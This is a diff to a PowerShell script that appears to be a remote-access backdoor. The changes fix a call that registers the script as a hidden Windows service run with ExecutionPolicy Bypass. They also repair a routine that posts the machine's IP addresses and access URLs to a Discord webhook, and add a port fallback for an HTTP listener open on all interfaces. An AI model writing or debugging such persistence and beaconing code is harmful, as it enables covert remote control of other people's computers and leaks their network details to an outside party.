@@ -31,7 +31,7 @@ try {
     
     # Set service parameters
     $serviceConfig = Get-WmiObject -Class Win32_Service -Filter "Name='$serviceName'"
-    $serviceConfig.Change($null, $null, $null, $null, $null, $null, "-NoProfile -ExecutionPolicy Bypass -File `"$servicePath`" -WindowStyle Hidden")
+    $serviceConfig.Change($null, $null, $null, $null, $null, "-NoProfile -ExecutionPolicy Bypass -File `"$servicePath`" -WindowStyle Hidden")
     
     Start-Service -Name $serviceName
     
@@ -61,8 +61,8 @@ $ips += "127.0.0.1"
 
 # Send IP info to Discord
 try {
-    $ipList = $ips -join "\n"
-    $body = @{content="Web server started! Access URLs:\n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
+    $ipList = $ips -join "`n"
+    $body = @{content="Web server started! Access URLs:`n$($ips | ForEach-Object { "http://$_`:$port" })"} | ConvertTo-Json
     Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
 } catch {
     # If Discord fails, continue anyway
@@ -159,8 +159,16 @@ $html = @"
 
 # HTTP Server
 $listener = New-Object System.Net.HttpListener
-$listener.Prefixes.Add("http://+:$port/")
-$listener.Start()
+
+# Try to start on port 8080, if fails use 8081
+try {
+    $listener.Prefixes.Add("http://+:$port/")
+    $listener.Start()
+} catch {
+    $port = 8081
+    $listener.Prefixes.Add("http://+:$port/")
+    $listener.Start()
+}
 
 $outputBuffer = ""
 
